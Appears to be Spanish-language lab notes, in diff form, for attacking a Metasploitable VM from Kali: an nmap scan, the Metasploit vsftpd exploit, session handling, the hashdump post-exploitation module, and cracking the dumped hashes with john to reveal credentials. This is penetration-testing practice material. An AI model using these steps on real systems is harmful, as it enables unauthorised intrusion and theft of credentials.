@@ -1,0 +1,47 @@
+++ PC1: Kali
+++ PC2: Metasploitable
+
+++ Comandos a ejecutar PC1:
+
+++ nmap -sV <ip_PC2>
+
+++ msfconsole 
+
+++ search vsftpd
+
+++ use 1
+
+++ show options
+
+++ exploit
+--- y
+--- sessions
+--- sessions -u 1
+--- sessions -i 2
+--- ifconfig 
+--- exit
+
+++ search post/linux/gather
+--- use post/linux/gather/hashdump
+--- show options
+--- set SESSION 1
+--- exploit
+--- copiar ruta de los hashs
+--- john
+--- las credenciales asociadas a PC2 serán visibles
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
